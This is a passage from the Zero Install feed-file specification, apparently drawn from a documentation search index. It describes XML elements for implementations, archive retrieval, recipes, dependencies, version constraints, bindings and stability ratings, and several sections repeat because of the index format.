interface. If main is given then it must be an absolute path. If the distributions attribute is present then it is a space-separated list of distribution names where this element applies. 0launch >= 0.45 ranks the <package-implementation> elements according to how well they match the host distribution and then only uses the best match (or matches, if several get the same score). See Distribution integration for a list of supported distributions. Earlier versions of 0launch ignore the distributions attribute and process all of the elements. Note that, unlike a normal implementation, a distribution package does not resolve to a directory. Any bindings inside <requires> elements for the interface will be ignored; it is assumed that the requiring component knows how to use the packaged version without further help. Therefore, adding distribution packages to your interface considerably weakens the guarantees you are making about what the requester may get. Package implementations still inherit attributes and dependencies from their parent group. The doc-dir and license attributes may be given, but version and released are read from the native packaging system. If version is given then only implmentations matching this pattern are used (0install >= 2.14). This allows multiple <packages-implmentation> elements for a single distribution package, which is useful if different versions have different requirements. See Constraints for the syntax. Retrieval methods A retrieval method is a way of getting an implementation. The most common retrieval method is the <archive> element: <archive href='...' size='...' extract='...' ? dest='...' ? type='...' ? start-offset='...' ? /> This states that an archive may be downloaded from the address given in the href attribute. The archive must have the given size or it will be rejected. When unpacked (either the subdirectory named in the extract attribute, or the whole archive if it is not present), the resulting tree will generate a manifest with the secure hash value given as the implementation's id . If dest is given (0install >= 2.1), then the archive is unpacked to the specified subdirectory. It is an error to specify a target outside of the implementation directory (e.g. ../foo or attempting to follow a symlink that points out of the implementation). Note that the extract attribute cannot contain / or \\ characters, so it can only be used to extract a top-level directory. It is intended for archives that contain their own name as the single top-level entry. The type of the archive is given as a MIME type in the type attribute (since 0install version 0.21). If missing, the type is guessed from the extension on the href attribute (all versions). Known types and extensions (case insensitive) are: application/x-rpm ( .rpm ) - not supported by Windows version application/x-deb ( .deb ) - not supported by Windows version application/x-tar ( .tar ) application/x-bzip-compressed-tar ( .tar.bz2 ) application/x-lzma-compressed-tar ( .tar.lzma ) application/x-compressed-tar ( .tar.gz or .tgz ) application/zip ( .zip ) application/vnd.ms-cab-compressed ( .cab ) application/x-xz-compressed-tar ( .tar.xz ) - since version 0.43, not supported by Windows version application/x-ruby-gem ( .gem ) - since version 1.0-rc1, not supported by Windows version application/x-7z-compressed ( .7z ) - Windows version only application/x-msi ( .msi ) - Windows version only The start-offset attribute (since version 0.21) gives the number of bytes at the beginning of the file which should be ignored. This is useful for some self-extracting archives which are made up of a shell script followed by a normal archive in a single file. If missing, it defaults to 0. The value in the size attribute does not include the skipped bytes. You can also fetch individual files (0install >= 2.1). This is useful for e.g. jar files, which are typically not unpacked: <file href='...' size='...' dest='...' executable='true|false' /> The file is downloaded from href , must be of the given size , and is placed within the implementation directory as dest . If executable is set to true (0install >= 2.14.2) the file is marked as executable after download. Recipes An implementation can also be created by following a <recipe> : <recipe> ( <archive ...> | <file ...> | <rename ...> | <remove ...> | <copy-from ...> ) + </recipe> In this case, each child element of the recipe represents a step. To get an implementation by following a recipe, a new empty directory is created and then all of the steps are performed in sequence. The resulting directory must have the digest given in the implementation's <manifest-digest> . A recipe containing only a single archive is equivalent to just specifying the archive on its own. If a recipe contains an unrecognised element then the whole recipe must be ignored. <archive ...> Causes the named archive to be fetched and unpacked over the top of whatever is currently in the temporary directory. It supports the same attributes as when used outside of a recipe. <file ...> Causes the named file to be fetched and saved over the top of whatever is currently in the temporary directory (0install >= 2.1). It supports the same attributes as when used outside of a recipe. <rename source='...' dest='...'> Renames or moves a file or directory (0install >= 1.10). It is an error if the source or destination are outside the implementation. <remove path='...'> Delete the file or directory from the implementation (0install >= 2.1). It is an error if the path is outside the implementation. <copy-from id='...' source='...' ? dest='...' ?> Copies files or directories from another implementation, e.g., for applying an update to a previous version (0install >= 2.13). The specified id must exactly match the id attribute of another implementation specified elsewhere in the same feed. You can specify the source and destination file or directory to be copied relative to the implementation root. Leave them unset to copy the entire implementation. Note: A recipe is generally only useful for patching existing archives without having to host the complete result yourself. Normally, if your program requires files from several different packages then it is better to use the <requires> element instead. This allows libraries to be shared between different programs, and lets the user choose the versions and upgrade them individually. Dependencies A <requires> element means that every implementation within the same group (including nested sub-groups) requires an implementation of the specified interface when run. 0install will choose a suitable implementation, downloading one if required. <requires interface='...' importance='...' ? version='...' ? os='...' ? distribution='...' ? source='true|false' ? use='...' ? > [ constraints ] * [ bindings ] * </requires> The constraint elements (if any) limit the set of acceptable versions. The bindings specify how 0install should make its choice known (typically, by setting environment variables). The use attribute can be used to indicate that this dependency is only needed in some cases. By default, 0launch >= 0.43 will skip any <requires> element with this attribute set. Earlier versions process all <requires> elements whether this attribute is present or not. 0test >= 0.2 will process dependencies where use=\"testing\" , in addition to the program's normal dependencies. This attribute is deprecated - it's usually better to use a <command> for this. The importance attribute (0install >= 1.1) can be either essential (the default; a version of this dependency must be selected) or recommended (no version is also an option, although selecting a version is preferable to not selecting one). The version attribute (0install >= 1.13) provides a quick way to specify the permitted versions. See the Constraints section below. The distribution attribute (0install >= 1.15) can be used to require the selected implementation to be from the given distribution. For example, a Python library available through MacPorts can only be used with a version of Python which is also from MacPorts. The value of this attribute is a space-separated list of distribution names. In addition to the official list of distribution names , the special value 0install may be used to require an implementation provided by 0instal (i.e. one not provided by a <package-implementation> ). The os attribute (0install >= 1.12) can be used to indicate that the dependency only applies to the given OS (e.g. os=\"Windows\" for dependencies only needed on Windows systems). The source attribute (0install >= 2.8) can be used to indicate that a source implementation is needed rather than a binary. This may be useful if you want to get e.g. header files from a source package. Note that if you select both source and binary implementations of an interface, 0install does not automatically force them to be the same version. A <restricts> element (0install >= 1.10) can be used to apply constraints without creating a dependency: <restricts interface='...' version='...' ? os='...' ? distribution='...' ? > [ constraints ] * </restricts> Internally, <restricts> behaves much like <requires importance='recommended'> , except that it doesn't try to cause the interface to be selected at all. Constraints Constraints appear on <requires> , <restricts> , <package-implementation> and <runner> elements. They restrict the set of versions from which 0install may choose an implementation. Since 0install 1.13, you can use the version attribute on the dependency element. The attribute's value is a list of ranges, separated by | , any of which may match. For example: <restricts interface='http://repo.roscidus.com/python/python' version='2.6..!3 | 3.2.2..'/> This allows Python versions 2.6, 2.7 and 3.3, but not 2.5 or 3. Each range is in the form START..!END . The range matches versions where START <= VERSION < END . The start or end may be omitted. A single version number may be used instead of a range to match only that version, or !VERSION to match everything except that version. There is also an older syntax which also works with 0install < 1.13, where a child node is used instead: <version not-before='...' ? before='...' ? > not-before This is the lowest-numbered version that can be chosen. before This version and all later versions are unsuitable. For example, <version not-before='2.4' before='2.6'> allows any of these versions: 2.4, 2.4.0, and 2.4.8. It will not select 2.3.9 or 2.6. This older syntax is not supported with <packager-implementation> . Bindings Bindings specify how the chosen implementation is made known to the running program. Bindings can appear in a <requires> element, in which case they tell a component how to find its dependency, or in an <implementation> (or group), where they tell a component how to find itself. Environment bindings <environment name='...' (insert='...' | value='...') mode='prepend|append|replace' ? separator='...' ? default='...' ? /> * Details of the chosen implementation are passed to the program by setting environment variables, as specified by the <environment> elements (typically, there will be exactly one of these in each <requires> element). Each environment element gives the name of the variable and the relative path of the item within the implementation to insert into the variable's value. Usually, the (badly-named) insert attribute is used, which adds a path to a file or directory inside the implementation to the environment variable. For example, <environment name='PATH' insert='bin'/> would perform something similar to the bash shell statement export PATH=/path/to/impl/bin:$PATH . Alternatively, you can use the value attribute to use a literal string. For example, <environment name='GRAPHICAL_MODE' value='TRUE' mode='replace'/> . This requires 0launch >= 0.52. If mode is prepend (or not set), then the absolute path of the item is prepended to the current value of the variable. The default separator character is the colon character on POSIX systems, and semi-colon on Windows. This can be overridden using separator (0install >= 1.1). If the environment variable is not currently set then the path is prepended to the value of the default attribute. If no default value is given either then the default for that environment variable is used, or the environment variable's value is set to the absolute path directly if there is no default. If mode is append then the same thing happens, except that the new value is added at the end instead of the beginning. If the mode is replace then the old value is overwritten, and the default attribute is ignored. The following environment variables have known defaults and therefore the default attribute is not needed with them: Name Default PATH /bin:/usr/bin XDG_CONFIG_DIRS /etc/xdg XDG_DATA_DIRS /usr/local/share:/usr/share Executable bindings These both require 0install >= 1.2. <executable-in-var name='...' command='...' ? /> <executable-in-path name='...' command='...' ? /> These are used when the program needs to run another program. command says which of the program's commands to use; the default is run . <executable-in-var> stores the path of the selected executable in the named environment variable. For example, if a program uses $MAKE to run make, you can provide the required command like this: <requires interface=\"http://repo.roscidus.com/devel/make\"> <executable-in-var name='MAKE'/> </requires> <executable-in-path> works in a similar way, except that it adds a directory containing the executable to $PATH . For example, if the program instead just runs the make command, you would use: <requires interface=\"http://repo.roscidus.com/devel/make\"> <executable-in-path name='make'/> </requires> It is preferable to use <executable-in-var> where possible, to avoid making $PATH very long. Implementation note: On POSIX systems, 0install will create a shell script under ~/.cache/0install.net/injector/executables and pass the path of this script. Generic bindings Custom bindings can be specified using the <binding> element (0install >= 2.1). 0install will not know how to run a program using custom bindings itself, but it will include them in any selections documents it creates, which can then be executed by your custom code. The syntax is: <binding path='...' ? command='...' ? ... > ... </binding> If command is given, then 0install will select the given <command> within the implementation (which may cause additional dependencies and bindings to be selected). Otherwise, no command is selected. Any additional attributes and child elements are not processed, but are just passed through. If your binding needs a path within the selected implemention, it is suggested that the path attribute be used for this. Other attributes and child elements should be namespaced to avoid collisions. For example, the EBox application launcher allows each code module to specify its dependencies, which are then available in the module's scope as getters . The ebox-edit application depends on the help library like this: <requires interface=\"http://0install.net/tests/ebox-help.xml\"> <binding e:getter='help'/> </requires> Versions A version number string has the following form: Version := DottedList (\"-\" Modifier? DottedList?)* DottedList := (Integer (\".\" Integer)*) Modifier := \"pre\" | \"rc\" | \"post\" Numerically, the modifiers come in the order -pre (pre-release), -rc (release candidate), - (no modifier name), -post (post-release or patch level). Versions are ordered like this: 0.1 1 1.0 1.1 1.2-pre 1.2-pre1 1.2-rc1 1.2 1.2-0 1.2-post 1.2-post1-pre 1.2-post1 1.2.1-pre 1.2.1.4 1.2.2 1.2.10 3 0install doesn't care about anything other than the sort order (i.e., whether one version comes before or after another). It is expected that an implementation can be safely replaced by one with a later version number, but not necessarily with an earlier one. So, if an application works with version 1.2.1 of a library then it should also work with version 1.2.2 or 1.3 or even 5.7 , but not 1.2.0 . This is a little different to some other systems, where numbers in different places have different meanings. For example, if the latest version of a library you use is version 5.1, then you shouldn't add the restriction before='5.2' , because when 5.2 comes out it should still work with your program. Of course, this might not always work, and hopefully the problem will be reported while the new library version is marked as testing (before most users hit the problem). Once you know that 5.2 is a problem, you can add the before='5.2' restriction to the implementation then. Incompatible changes (where a newer version cannot be used in place of an older version) to an interface should be handled by creating a new interface URI. Eg: http://gtk.org/2005/interfaces/GTK-1.2.x (contains 1.2.0, 1.2.1, 1.2.2, ...) http://gtk.org/2005/interfaces/GTK-2.x (contains 2.0.0, 2.0.1, 2.2.0, 2.4.0, 2.4.1, ...) Note that version numbers containing dash characters were not supported before version 0.24 of 0install and so a version-modifier attribute was added to allow new-style versions to be added without breaking older versions. This should no longer be used. The integers in version numbers must be representable as 64-bit signed integers. Stability The feed file also gives a stability rating for each implementation. The following levels are allowed (must be lowercase in the feed files): stable testing developer buggy insecure Stability ratings are expected to change over time. When any new release is made, its stability should be set to testing . Users who have selected Help test new versions will then start using it. Other users will continue with the previous stable release. After a while (days, weeks or months, depending on the project) with no serious problems found, the implementation's stability can be changed to stable so that everyone will use it. If problems are found, it can instead be marked as buggy , or insecure . 0install won't select either by default, but it is useful to users to see the reason (users may opt to continue using a buggy version if it seems to work for them, but they should never use an insecure one). developer is like a more extreme version of testing , where the program is expected to have bugs. When to use 'buggy' Don't mark old releases as buggy every time you do a new release, just because a few bugs have been fixed. People who have selected Network use: Full will automatically upgrade to the new version anyway, so marking an older version as buggy only affects people who have explicitly stated that they don't want to use the latest version, but would prefer to use an older release to save network use. Entry points (only used on the Windows version currently) Entry points allow you to associate additional information with <command> names, such as user-friendly names and descriptions. Entry points are used by the Zero Install GUI to help the user choose a command and by the desktop integration system to generate appropriate menu entries for commands. An entry point is not necessary for a command to work but it makes it more discoverable to end-users. Entry points are top-level elements and, unlike commands, are not associated with any specific implementation or group. One entry point represents all commands in all implementations that carry the same name. An entry point has this syntax: <entry-point command='...' binary-name='...' ? > <needs-terminal/> ? <name>...</name> ? <summary>...</summary> ? <description>...</description> ? <icon type='...' href='...'/> * </group> command the name of the command this entry point represents binary-name the canonical name of the binary supplying the command (without file extensions); this is used to suggest suitable alias names. <needs-terminal> if present, this element indicates that the command represented by this entry point requires a terminal in order to run. <name> user-friendly name for the command. If not present, the value of the command attribute is used instead. <summary> a short one-line description; the first word should not be upper-case unless it is a proper noun (e.g. \"cures all ills\") <description> a full description, which can be several paragraphs long <icon> an icon to represent the command; this is used when creating menu entries. You should provide an icon of the type image/png ( .png ) for Linux apps and image/vnd.microsoft.icon ( .ico ) for Windows apps. Metadata All elements can contain extension elements, provided they are not in the Zero Install namespace used by the elements defined here. 0install does not currently make use of these elements itself, but other programs may find them useful. In future, some of these may be used (for example, the GUI may display the license terms). The use of Dublin Core is suggested for the following concepts, which have the following meanings when found as a direct child of a <group> or <implementation> element: dc:creator The primary author of the program. dc:publisher The person who created this implementation. For a binary, this is the person who compiled it. Other Dublin Core terms that may be useful include contributor , dateCopyrighted , language , rights and rightsHolder . These terms are not required as they are duplicated by the core Zero Install terms: identifier ( id ), available ( released ) and requires ( requires ). The source element may be used in future to record the source used to build this implementation. Digital signatures When a feed is downloaded from the web, it must contain a digital signature. A feed is signed by appending an XML comment block of the form: <!-- Base64 Signature iD8DBQBEXM/qrgeCgFmlPMERArNSAKDBuNz5SQMZ8rwJmW2fhNHJwor6KwCgwx7XEfY+6gUC90rJ b5eCY+I8HNA= --> This block must go at the end of the file, and contains a Base64-encoded version of the file that would be created by using gpg --detach-sign on the original feed. The signature block must start on a new line, may not contain anything except valid base64 characters, and nothing may follow the signature block. XML signature blocks are supported from version 0.18 of 0install and may be generated easily using the 0publish command. Local interfaces are plain XML, although having an XML signature block is no problem as it will be ignored as a normal XML comment. Valid architecture names The arch attribute is a value in the form OS-CPU . The values come from the uname system call, but there is some normalisation (e.g. because Windows doesn't report the same CPU names as Linux). Valid values for OS include: * Cygwin (a Unix-compatibility layer for Windows) Darwin (MacOSX, without the proprietary bits) FreeBSD Linux MacOSX Windows Valid values for CPU include: * src i386 i486 i586 i686 ppc ppc64 x86_64 armv6l armv7l The if-0install-version attribute To make it possible to use newer features in a feed without breaking older versions of 0install, the if-0install-version attribute may be placed on any element to indicate that the element should only be processed by the specified versions of 0install. For example: <group> <new-element if-0install-version='1.14..'/> <fallback if-0install-version='..!1.14'/> </group> In this example, 0install 1.14 and later will see <new-element> , while older versions see <fallback> . The syntax is as described in Constraints . However, 0install versions before 1.13 ignore this attribute and process all elements. Well-known extensions The following are well-known extensions to the Zero Install format: Capabilities (provides information for desktop integration of applications) Future plans The extra meta-data elements need to be better specified. As well as before and not-before, we should support after and not-after. It should be possible to give a delta (binary patch) against a previous version, to make upgrading quicker. It should be possible to scope bindings. For example, when a DTP package requires a clipart package, the clipart package should not be allowed to affect the DTP package's environment.","title":"Feed files"},{"location":"specifications/feed/#introduction","text":"Feed files are introduced in the Packagers Documentation . They have the following syntax ( ? follows optional items, * means zero-or-more, order of elements is not important, and extension elements can appear anywhere as long as they use a different namespace): <?xml version='1.0'?> <interface xmlns='http://zero-install.sourceforge.net/2004/injector/interface' min-injector-version='...' ? uri='...' ? > <name>...</name> <summary>...</summary> <description>...</description> ? <homepage>...</homepage> ? <category type='...' ? >...</category> * <needs-terminal/> ? <icon type='...' href='...'/> * <feed src='../img/...' langs='...' ? arch='...' ?/> * <feed-for interface='...'/> * <replaced-by interface='...'/> ? [group] * [implementation] * [entry-point] * </interface> min-injector-version This attribute gives the oldest version of 0install that can read this file. Older versions will tell the user to upgrade if they are asked to read the file. Versions prior to 0.20 do not perform this check, however. If the attribute is not present, the file can be read by all versions. uri This attribute is only needed for remote feeds (fetched via HTTP). The value must exactly match the expected URL, to prevent an attacker replacing one correctly-signed feed with another (e.g., returning a feed for the shred program when the user asked for the backup program). <name> a short name to identify the interface (e.g. \"Foo\") <summary> a short one-line description; the first word should not be upper-case unless it is a proper noun (e.g. \"cures all ills\") <description> a full description, which can be several paragraphs long (optional since 0.32, but recommended) <homepage> the URL of a web-page describing this interface in more detail <category> a classification for the interface. If no type is given, then the category is one of the 'Main' categories defined by the freedesktop.org menu specification . Otherwise, it is a URI giving the namespace for the category. <needs-terminal> if present, this element indicates that the program requires a terminal in order to run. Graphical launchers should therefore run this program in a suitable terminal emulator. <icon> an icon to use for the program; this is used by programs such as AddApp and desktop integration . You should provide an icon of the type image/png ( .png ) for display in browsers and launchers on Linux. For Windows apps you should additionally provide an icon of the type image/vnd.microsoft.icon ( .ico ). <feed> the linked feed contains more implementations of this feed's interface. The langs and arch attributes, if present, indicate that all implementations will fall within these limits (e.g. arch='*-src' means that there is no point fetching this feed unless you are looking for source code). See the <implementation> element for a description of the values of these attributes. <feed-for> the implementations in this feed are implementations of the given interface. This is used when adding an optional extra feed to an interface with 0install add-feed (e.g. a local feed for a development version). <replaced-by> this feed's interface (the one in the root element's uri attribute) has been replaced by the given interface. Any references to the old URI should be updated to use the new one.","title":"Introduction"},{"location":"specifications/feed/#groups","text":"A group has this syntax: <group version='...' ? released='...' ? main='...' ? self-test='...' ? doc-dir='...' ? license='...' ? released='...' ? stability='...' ? langs='...' ? arch='...' ? > [requires] * [group] * [command] * [binding] * [implementation] * [package-implementation] * </group> All attributes of the group are inherited by any child groups and implementations as defaults, but can be overridden there. All dependencies ( requires ), bindings and commands are inherited (sub-groups may add more dependencies and bindings to the list, but cannot remove anything).","title":"Groups"},{"location":"specifications/feed/#implementations","text":"An implementation has this syntax (an unspecified argument is inherited from the closest ancestor <group> which defines it): <implementation [all <group> attributes] id='...' local-path='...' ? > <manifest-digest [digest] * /> * [command] * [retrieval-method] * [binding] * [requires] * </implementation> id A unique identifier for this implementation. For example, when the user marks a particular version as buggy this identifier is used to keep track of it, and saving and restoring selections uses it. However, see the important historical note below. local-path If the feed file is a local file (the interface uri starts with / ) then the local-path attribute may contain the pathname of a local directory (either an absolute path or a path relative to the directory containing the feed file). See the historical note below. version The version number. See the version numbers section below for more details. main (deprecated) The relative path of an executable inside the implementation that should be executed by default when the interface is run. If an implementation has no main setting, then it cannot be executed without specifying one manually (with 0launch --main=MAIN ). This typically means that the interface is for a library. Note: main is being replaced by the <command> element. self-test (deprecated) The relative path of an executable inside the implementation that can be executed to test the program. The program must be non-interactive (e.g. it can't open any windows or prompt for input). It should return with an exit status of zero if the tests pass. Any other status indicates failure. Note: self-test is being replaced by the <command> element. doc-dir The relative path of a directory inside the implementation that contains the package's documentation. This is the directory that would end up inside /usr/share/doc on a traditional Linux system. released The date this implementation was made available, in the format YYYY-MM-DD . For development versions checked out from version control this attribute should not be present. stability The default stability rating for this implementation. If not present, testing is used. See the stability section below for more details. langs The natural language(s) which this package supports, as a space-separated list of languages codes (in the same format as used by the $LANG environment variable). For example, the value en_GB fr would be used for a package supporting British English and French. Supported since 0.48. Note that versions before 0.54 require the region separator to be _ (underscore), while later versions also allow the use of - for consistency with the xml:lang format. arch For platform-specific binaries, the platform for which this implementation was compiled, in the form os-cpu . 0install knows that certain platforms are backwards-compatible with others, so binaries with arch=\"Linux-i486\" will still be available on Linux-i686 machines, for example. Either the os or cpu part may be * , which will make it available on any OS or CPU. If missing, the default is *-* . See also: Valid architecture names . license License terms. This is typically a Trove category. See the PyPI list for some examples (the leading License :: is not included). The manifest-digest element is used to give digests of the .manifest file using various hashing algorithms (but see the historical note below). Having multiple algorithms allows a smooth upgrade to newer digest algorithms without breaking old clients. Each non-namespaced attribute gives a digest, with the attribute name being the algorithm. For example: <manifest-digest sha256=\"4f078f9080bd9b3b87e8360f014268886ec653ed077bb3cb6725185c0a07473a\"/> For non-local implementations (those without a local-path attribute), the <implementation> element contains a set of retrieval methods , each of which gives a different way of getting the implementation (i.e. of getting a directory structure whose digest matches the ones given). Currently, 0install always chooses the first of the methods it understands, but in future it may use other strategies (such as choosing the closest mirror, or letting the user select one manually). It may also use other methods which aren't listed, such as searching for the implementation on a peer-to-peer network. Unrecognised elements inside an implementation are ignored.","title":"Implementations"},{"location":"specifications/feed/#historical-note-about-id","text":"0launch >= 0.45 generally treats the ID as a simple identifier, and gets the local path (if any) from the local-path attribute and the digests from the <manifest-digest> . 0launch < 0.45 ignores the local-path attribute and the <manifest-digest> element. If the ID starts with . or / then the ID is also the local path; otherwise, it is the single manifest digest. For backwards compatibility, 0launch >= 0.45 will treat an ID starting with . or / as a local path if no local-path attribute is present, and it will treat it as an additional digest if it contains an = character. Therefore, if you want to generate feeds compatible with past and future versions: If you have a digest, set the ID to sha1new=... and put the sha256 digest in the <manifest-digest> . If you have a local implementation then set both id and local-path to the pathname.","title":"Historical note about id"},{"location":"specifications/feed/#commands","text":"The main attribute above provides a simple way to say how to run this implementation. The <command> element (supported since 0.51, released Dec 2010) provides a more flexible alternative. <command name='...' path='...' ? > [binding] * [requires] * [runner] ? <arg> ... </arg> * <for-each item-from='...' separator='...'? > ... </for-each> * </command> name By default, 0launch executes the run command, but the --command option can be used to specify a different one. 0test runs the test command (replacing the old self-test attribute) and 0compile runs the compile command (replacing the compile:command attribute). path The relative path of the executable within the implementation (optional if <runner> is used). Additional arguments can be passed using the <arg> element. Within an argument, ${name} is expanded to the value of the corresponding environment variable. These arguments are passed to the program before any arguments specified by the user. If an environment variable should be expanded to multiple arguments, use <for-each> . The variable in the item-from attribute is split using the given separator (which defaults to the OS path separator, : on POSIX and ; on Windows) and the arguments inside the element are added for each item. The current item is available as ${item} . If the variable given in item-from is not set or is empty, no arguments are added. See below for an example. Versions of 0install before 1.15 ignore <for-each> elements and their contents. Command-specific dependencies can be specified for a command by nesting <requires> elements. For example, an interpreter might only depend on libreadline when used interactively, but not when used as a library, or the test command might depend on a test framework. Command-specific bindings (0launch >= 1.3) create a binding from the implementation to itself. For example, the test command may want to make the run command available in $PATH using <executable-in-path> . The <runner> element introduces a special kind of dependency: the program that is used to run this one. For example, a Python program might specify Python as its runner. <runner> is a subclass of <requires> and accepts the same attributes and child elements. In addition, you can specify arguments to pass to the runner by nesting them inside the <runner> element. These arguments are passed before the path of the executable given by the path attribute. For example: <command name='run' path=\"causeway.e-swt\"> <runner interface='http://repo.roscidus.com/e/e-core'> <arg>-cpa</arg> <arg>$SWT_JAR</arg> <for-each item-from=\"EXTRA_E_OPTIONS\" separator=\" \"> <arg>${item}</arg> </for-each> </runner> </command> In this case, 0install will run the equivalent of /path/to/e-interpreter -cpa /path/to/swt.jar $EXTRA_E_OPTIONS /path/to/causeway.e-swt .","title":"Commands"},{"location":"specifications/feed/#package-implementations","text":"This element names a distribution-provided package which, if present, is a valid implementation of this interface. The syntax is: <package-implementation package='...' distributions='...' ? main='...' ? version='...' ? > [command] * [requires] * </package-implementation> Support for distribution packages was added in version 0.28 of 0install. Earlier versions ignore this element. If the named package is available then it will be considered as a possible implementation of the interface. If main is given then it must be an absolute path. If the distributions attribute is present then it is a space-separated list of distribution names where this element applies. 0launch >= 0.45 ranks the <package-implementation> elements according to how well they match the host distribution and then only uses the best match (or matches, if several get the same score). See Distribution integration for a list of supported distributions. Earlier versions of 0launch ignore the distributions attribute and process all of the elements. Note that, unlike a normal implementation, a distribution package does not resolve to a directory. Any bindings inside <requires> elements for the interface will be ignored; it is assumed that the requiring component knows how to use the packaged version without further help. Therefore, adding distribution packages to your interface considerably weakens the guarantees you are making about what the requester may get. Package implementations still inherit attributes and dependencies from their parent group. The doc-dir and license attributes may be given, but version and released are read from the native packaging system. If version is given then only implmentations matching this pattern are used (0install >= 2.14). This allows multiple <packages-implmentation> elements for a single distribution package, which is useful if different versions have different requirements. See Constraints for the syntax.","title":"Package implementations"},{"location":"specifications/feed/#retrieval-methods","text":"A retrieval method is a way of getting an implementation. The most common retrieval method is the <archive> element: <archive href='...' size='...' extract='...' ? dest='...' ? type='...' ? start-offset='...' ? /> This states that an archive may be downloaded from the address given in the href attribute. The archive must have the given size or it will be rejected. When unpacked (either the subdirectory named in the extract attribute, or the whole archive if it is not present), the resulting tree will generate a manifest with the secure hash value given as the implementation's id . If dest is given (0install >= 2.1), then the archive is unpacked to the specified subdirectory. It is an error to specify a target outside of the implementation directory (e.g. ../foo or attempting to follow a symlink that points out of the implementation). Note that the extract attribute cannot contain / or \\ characters, so it can only be used to extract a top-level directory. It is intended for archives that contain their own name as the single top-level entry. The type of the archive is given as a MIME type in the type attribute (since 0install version 0.21). If missing, the type is guessed from the extension on the href attribute (all versions). Known types and extensions (case insensitive) are: application/x-rpm ( .rpm ) - not supported by Windows version application/x-deb ( .deb ) - not supported by Windows version application/x-tar ( .tar ) application/x-bzip-compressed-tar ( .tar.bz2 ) application/x-lzma-compressed-tar ( .tar.lzma ) application/x-compressed-tar ( .tar.gz or .tgz ) application/zip ( .zip ) application/vnd.ms-cab-compressed ( .cab ) application/x-xz-compressed-tar ( .tar.xz ) - since version 0.43, not supported by Windows version application/x-ruby-gem ( .gem ) - since version 1.0-rc1, not supported by Windows version application/x-7z-compressed ( .7z ) - Windows version only application/x-msi ( .msi ) - Windows version only The start-offset attribute (since version 0.21) gives the number of bytes at the beginning of the file which should be ignored. This is useful for some self-extracting archives which are made up of a shell script followed by a normal archive in a single file. If missing, it defaults to 0. The value in the size attribute does not include the skipped bytes. You can also fetch individual files (0install >= 2.1). This is useful for e.g. jar files, which are typically not unpacked: <file href='...' size='...' dest='...' executable='true|false' /> The file is downloaded from href , must be of the given size , and is placed within the implementation directory as dest . If executable is set to true (0install >= 2.14.2) the file is marked as executable after download.","title":"Retrieval methods"},{"location":"specifications/feed/#recipes","text":"An implementation can also be created by following a <recipe> : <recipe> ( <archive ...> | <file ...> | <rename ...> | <remove ...> | <copy-from ...> ) + </recipe> In this case, each child element of the recipe represents a step. To get an implementation by following a recipe, a new empty directory is created and then all of the steps are performed in sequence. The resulting directory must have the digest given in the implementation's <manifest-digest> . A recipe containing only a single archive is equivalent to just specifying the archive on its own. If a recipe contains an unrecognised element then the whole recipe must be ignored. <archive ...> Causes the named archive to be fetched and unpacked over the top of whatever is currently in the temporary directory. It supports the same attributes as when used outside of a recipe. <file ...> Causes the named file to be fetched and saved over the top of whatever is currently in the temporary directory (0install >= 2.1). It supports the same attributes as when used outside of a recipe. <rename source='...' dest='...'> Renames or moves a file or directory (0install >= 1.10). It is an error if the source or destination are outside the implementation. <remove path='...'> Delete the file or directory from the implementation (0install >= 2.1). It is an error if the path is outside the implementation. <copy-from id='...' source='...' ? dest='...' ?> Copies files or directories from another implementation, e.g., for applying an update to a previous version (0install >= 2.13). The specified id must exactly match the id attribute of another implementation specified elsewhere in the same feed. You can specify the source and destination file or directory to be copied relative to the implementation root. Leave them unset to copy the entire implementation. Note: A recipe is generally only useful for patching existing archives without having to host the complete result yourself. Normally, if your program requires files from several different packages then it is better to use the <requires> element instead. This allows libraries to be shared between different programs, and lets the user choose the versions and upgrade them individually.","title":"Recipes"},{"location":"specifications/feed/#dependencies","text":"A <requires> element means that every implementation within the same group (including nested sub-groups) requires an implementation of the specified interface when run. 0install will choose a suitable implementation, downloading one if required. <requires interface='...' importance='...' ? version='...' ? os='...' ? distribution='...' ? source='true|false' ? use='...' ? > [ constraints ] * [ bindings ] * </requires> The constraint elements (if any) limit the set of acceptable versions. The bindings specify how 0install should make its choice known (typically, by setting environment variables). The use attribute can be used to indicate that this dependency is only needed in some cases. By default, 0launch >= 0.43 will skip any <requires> element with this attribute set. Earlier versions process all <requires> elements whether this attribute is present or not. 0test >= 0.2 will process dependencies where use=\"testing\" , in addition to the program's normal dependencies. This attribute is deprecated - it's usually better to use a <command> for this. The importance attribute (0install >= 1.1) can be either essential (the default; a version of this dependency must be selected) or recommended (no version is also an option, although selecting a version is preferable to not selecting one). The version attribute (0install >= 1.13) provides a quick way to specify the permitted versions. See the Constraints section below. The distribution attribute (0install >= 1.15) can be used to require the selected implementation to be from the given distribution. For example, a Python library available through MacPorts can only be used with a version of Python which is also from MacPorts. The value of this attribute is a space-separated list of distribution names. In addition to the official list of distribution names , the special value 0install may be used to require an implementation provided by 0instal (i.e. one not provided by a <package-implementation> ). The os attribute (0install >= 1.12) can be used to indicate that the dependency only applies to the given OS (e.g. os=\"Windows\" for dependencies only needed on Windows systems). The source attribute (0install >= 2.8) can be used to indicate that a source implementation is needed rather than a binary. This may be useful if you want to get e.g. header files from a source package. Note that if you select both source and binary implementations of an interface, 0install does not automatically force them to be the same version. A <restricts> element (0install >= 1.10) can be used to apply constraints without creating a dependency: <restricts interface='...' version='...' ? os='...' ? distribution='...' ? > [ constraints ] * </restricts> Internally, <restricts> behaves much like <requires importance='recommended'> , except that it doesn't try to cause the interface to be selected at all.","title":"Dependencies"},{"location":"specifications/feed/#constraints","text":"Constraints appear on <requires> , <restricts> , <package-implementation> and <runner> elements. They restrict the set of versions from which 0install may choose an implementation. Since 0install 1.13, you can use the version attribute on the dependency element. The attribute's value is a list of ranges, separated by | , any of which may match. For example: <restricts interface='http://repo.roscidus.com/python/python' version='2.6..!3 | 3.2.2..'/> This allows Python versions 2.6, 2.7 and 3.3, but not 2.5 or 3. Each range is in the form START..!END . The range matches versions where START <= VERSION < END . The start or end may be omitted. A single version number may be used instead of a range to match only that version, or !VERSION to match everything except that version. There is also an older syntax which also works with 0install < 1.13, where a child node is used instead: <version not-before='...' ? before='...' ? > not-before This is the lowest-numbered version that can be chosen. before This version and all later versions are unsuitable. For example, <version not-before='2.4' before='2.6'> allows any of these versions: 2.4, 2.4.0, and 2.4.8. It will not select 2.3.9 or 2.6. This older syntax is not supported with <packager-implementation> .","title":"Constraints"},{"location":"specifications/feed/#bindings","text":"Bindings specify how the chosen implementation is made known to the running program. Bindings can appear in a <requires> element, in which case they tell a component how to find its dependency, or in an <implementation> (or group), where they tell a component how to find 